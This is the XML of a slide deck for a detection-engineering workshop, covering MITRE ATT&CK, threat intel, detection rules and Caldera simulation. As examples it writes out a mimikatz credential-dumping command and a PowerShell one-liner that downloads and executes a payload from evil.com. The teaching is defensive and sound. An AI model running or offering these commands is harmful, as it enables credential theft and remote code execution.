      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1127" name="Google Shape;1127;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="2073203"/>
            <a:ext cx="3576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300"/>
              <a:t>WHAT MAKES A GOOD DETECTION?</a:t>
            </a:r>
            <a:endParaRPr b="1"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93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="742950" y="74295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5900"/>
              <a:t>Threat Intelligence </a:t>
            </a:r>
            <a:endParaRPr sz="5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5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5900"/>
              <a:t>Know Your Enemy_</a:t>
            </a:r>
            <a:endParaRPr sz="5900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1133" name="Google Shape;1133;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5619075" y="742950"/>
            <a:ext cx="2436300" cy="3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Why do we need threat intel?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- You can't detect what you don't understand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- Adversaries use known patterns (TTPs)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- Learn from others' incidents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- Prioritize what matters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SOURCES OF THREAT INTEL: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✓ MITRE ATT&amp;CK Framework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✓ Threat reports (CrowdStrike, Mandiant, etc.)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✓ CVE databases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✓ Incident response reports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✓ Community sharing (Twitter, blogs)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94"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3039975" y="1917000"/>
            <a:ext cx="6103900" cy="3226630"/>
            <a:chOff x="3039975" y="1917000"/>
            <a:chExt cx="6103900" cy="3226630"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1139" name="Google Shape;1139;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="1917000"/>
              <a:ext cx="61038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40" name="Google Shape;1140;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="3949323"/>
              <a:ext cx="1851000" cy="119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41" name="Google Shape;1141;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5802775" y="1917000"/>
              <a:ext cx="3341100" cy="286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42" name="Google Shape;1142;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="2475475"/>
              <a:ext cx="2187000" cy="1661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43" name="Google Shape;1143;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="3793330"/>
              <a:ext cx="2219100" cy="135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44" name="Google Shape;1144;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6966550" y="3523794"/>
              <a:ext cx="1853700" cy="1619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45" name="Google Shape;1145;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3217426"/>
              <a:ext cx="1851000" cy="1269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46" name="Google Shape;1146;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="2928954"/>
              <a:ext cx="18510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47" name="Google Shape;1147;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3899475"/>
              <a:ext cx="1851000" cy="1244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148" name="Google Shape;1148;p94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149" name="Google Shape;1149;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3234875" y="2215875"/>
            <a:ext cx="5424600" cy="19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Tactic: Credential Access (TA0006)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↓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Technique: OS Credential Dumping (T1003)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↓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Sub-technique: LSASS Memory (T1003.001)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↓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Procedure: Run mimikatz.exe sekurlsa::logonpasswords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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>🔑 KEY: Map your detections to ATT&amp;CK techniques</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="13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50" name="Google Shape;1150;p94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MITRE ATT&amp;CK FRAMEWORK_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1151" name="Google Shape;1151;p94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got 8 hour of workshop, so how can we ensure proper communication/fun?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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1152" name="Google Shape;1152;p94"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1917000"/>
            <a:ext cx="2846403" cy="3226550"/>
            <a:chOff x="0" y="1917000"/>
            <a:chExt cx="2846403" cy="3226550"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1153" name="Google Shape;1153;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="191700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54" name="Google Shape;1154;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="583203" y="219527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45720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55" name="Google Shape;1155;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="3709850"/>
              <a:ext cx="2263200" cy="1433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56" name="Google Shape;1156;p94"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406225" y="3904091"/>
              <a:ext cx="2263200" cy="123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157" name="Google Shape;1157;p94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A knowledge base of real-world adversary tactics and techniques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58" name="Google Shape;1158;p94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669427" y="4777621"/>
            <a:ext cx="418200" cy="36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59" name="Google Shape;1159;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="282450" y="2478900"/>
            <a:ext cx="1885200" cy="18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Tactics (WHY)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↓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Techniques (WHAT)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↓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pace Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>Procedures (HOW) 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0" name="Google Shape;1160;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="188375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TTP?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95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5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95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95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9" name="Google Shape;116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688" y="149513"/>
            <a:ext cx="8288625" cy="484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96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="221375" y="223900"/>
            <a:ext cx="81798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ATT&amp;CK Matrix - Tactics Overview_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1175" name="Google Shape;1175;p96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96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252425" y="1091525"/>
            <a:ext cx="4263600" cy="31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Reconnaissance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Resource Development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Initial Access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Execution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Persistence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Privilege Escalation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Defense Evasion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Credential Access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Discovery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Lateral Movement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Collection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Command &amp; Control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Exfiltration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Impact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TODAY'S FOCUS: Techniques 3-9 (Most common)</a:t>
            </a:r>
            <a:endParaRPr sz="1200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1177" name="Google Shape;1177;p96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4707725" y="986479"/>
            <a:ext cx="3866100" cy="324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Gathering information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Setting up infrastructure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Getting in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Running malicious code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Maintaining foothold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Getting higher permissions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Avoiding detection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Stealing credentials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Learning the environment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Moving through network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Gathering target data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Communicating with C2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Stealing data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 Medium"/>
              <a:buChar char="●"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Destructive actions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97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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TODAY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>'S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> TARGET TECHNIQUES_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1183" name="Google Shape;1183;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1214225" y="742950"/>
            <a:ext cx="7120200" cy="389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T1059.001	PowerShell Execution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Why: 		Used in 60%+ of attacks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Detection: 	Command line patterns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T1003.001	LSASS Memory Dumping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Why: 		Credential theft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Detection: 	Process access to lsass.exe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T1055		Process Injection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Why: 		Code execution, evasion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Detection: 	Suspicious process access patterns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T1047		Windows Management Instrumentation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Why: 		Remote execution, lateral movement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Detection: 	WMI process creation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T1053.005	Scheduled Task Creation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Why: 		Persistence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Detection: 	schtasks.exe usage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T1543.003	Windows Service Creation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Why: 		Persistence, privilege escalation </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3024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Detection: 	sc.exe or registry service creation</a:t>
            </a:r>
            <a:endParaRPr u="non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8" name="Google Shape;1188;p98"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="536160" y="3292160"/>
            <a:ext cx="6698921" cy="1598929"/>
            <a:chOff x="243225" y="2826700"/>
            <a:chExt cx="8648233" cy="2064200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1189" name="Google Shape;1189;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="243225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90" name="Google Shape;1190;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3181192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91" name="Google Shape;1191;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6119158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92" name="Google Shape;1192;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="193335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93" name="Google Shape;1193;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="487140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94" name="Google Shape;1194;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7804025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195" name="Google Shape;1195;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630327" y="3524208"/>
            <a:ext cx="19146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774"/>
              <a:t>Extract detection indicators </a:t>
            </a:r>
            <a:endParaRPr sz="774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774"/>
              <a:t>• Process: powershell.exe </a:t>
            </a:r>
            <a:endParaRPr sz="774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774"/>
              <a:t>• Flags: -nop, -w hidden, -encodedcommand </a:t>
            </a:r>
            <a:endParaRPr sz="774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774"/>
              <a:t>• Actions: DownloadString, IEX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1196" name="Google Shape;1196;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630327" y="3206147"/>
            <a:ext cx="11835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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #4</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1197" name="Google Shape;1197;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2919661" y="3524208"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Write detection rule </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Alert on powershell.exe with those patterns</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1198" name="Google Shape;1198;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2919661" y="3206147"/>
            <a:ext cx="11835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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #5</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1199" name="Google Shape;1199;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5206662" y="3524210"/>
            <a:ext cx="18927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20"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>TEST with real attack simulation</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1200" name="Google Shape;1200;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5206662" y="3206152"/>
            <a:ext cx="11991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #6</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1201" name="Google Shape;1201;p98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TRANSLATION PROCESS_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1202" name="Google Shape;1202;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="245425" y="1563575"/>
            <a:ext cx="36090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THREAT INTEL → DETECTION LOGIC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t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1203" name="Google Shape;1203;p98"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2353210" y="1526423"/>
            <a:ext cx="6698921" cy="1598929"/>
            <a:chOff x="243225" y="2826700"/>
            <a:chExt cx="8648233" cy="2064200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1204" name="Google Shape;1204;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="243225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05" name="Google Shape;1205;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3181192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06" name="Google Shape;1206;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6119158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07" name="Google Shape;1207;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="193335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08" name="Google Shape;1208;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="487140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09" name="Google Shape;1209;p98"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7804025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210" name="Google Shape;1210;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2449702" y="1758470"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Read threat report </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>"APT29 uses PowerShell to download payloads"</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1211" name="Google Shape;1211;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2449702" y="1440410"/>
            <a:ext cx="11835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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #1</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1212" name="Google Shape;1212;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4736711" y="1758470"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Identify ATT&amp;CK technique </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>T1059.001 - PowerShell</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1213" name="Google Shape;1213;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4736711" y="1440410"/>
            <a:ext cx="11835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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #2</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1214" name="Google Shape;1214;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7023712" y="1758473"/>
            <a:ext cx="18927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774"/>
              <a:t>Understand the procedure </a:t>
            </a:r>
            <a:endParaRPr sz="774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774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774"/>
              <a:t>powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1215" name="Google Shape;1215;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7023712" y="1440415"/>
            <a:ext cx="11991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t> #3</a:t>
            </a:r>
            <a:endParaRPr sz="116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99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2237350"/>
            <a:ext cx="3392400" cy="2653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21" name="Google Shape;1221;p99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195198" y="2990100"/>
            <a:ext cx="1696200" cy="190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22" name="Google Shape;1222;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2449750"/>
            <a:ext cx="3067200" cy="23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Caldera? </a:t>
            </a:r>
            <a:endParaRPr/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MITRE's open-source breach simulation platform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Executes real ATT&amp;CK techniques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Automated adversary campaigns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Safe, controlled environment</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1223" name="Google Shape;1223;p99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✓ Simulate real attacks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✓ Generate authentic attack logs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✓ Test our detections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/>
              <a:t>✓ Understand adversary tradecraft</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1224" name="Google Shape;1224;p99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USE CASE:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1225" name="Google Shape;1225;p99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CALDERA_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1226" name="Google Shape;1226;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598725" y="1485850"/>
            <a:ext cx="37194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/>
              <a:t>Automated adversary simulator used a lot in rule </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>life cycle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> development and purple teaming~~~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rPr lang="en"/>
              <a:t>Think: "Red team in a box"</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1227" name="Google Shape;1227;p99" title="1GcxpwJIQjohqntyIHEv7kA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57118" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546700" cy="3583199"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1228" name="Google Shape;1228;p99" title="10Orrz3R7fw3oRbkDGT7ktw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239" r="71405" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940900" cy="46688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00"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5732839" y="509050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34" name="Google Shape;1234;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6992062" y="1941875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35" name="Google Shape;1235;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659586" y="1768232"/>
            <a:ext cx="1366200" cy="136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36" name="Google Shape;1236;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4131054" y="1906353"/>
            <a:ext cx="1366200" cy="13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37" name="Google Shape;1237;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716879" y="3240250"/>
            <a:ext cx="1366200" cy="1366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38" name="Google Shape;1238;p100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6341261" y="3070173"/>
            <a:ext cx="1366200" cy="136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39" name="Google Shape;1239;p100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LOG ANALYSIS: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THE DETECTIVE WORK_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1240" name="Google Shape;1240;p100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rPr lang="en"/>
              <a:t>What makes a good analyst?</a:t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41" name="Google Shape;1241;p100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PROCESS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1242" name="Google Shape;1242;p100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1. Identify the event type</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1243" name="Google Shape;1243;p100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2. Extract key indicators</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1244" name="Google Shape;1244;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7099050" y="2378650"/>
            <a:ext cx="11502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3. Build context (before/after events)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1245" name="Google Shape;1245;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="title"/>
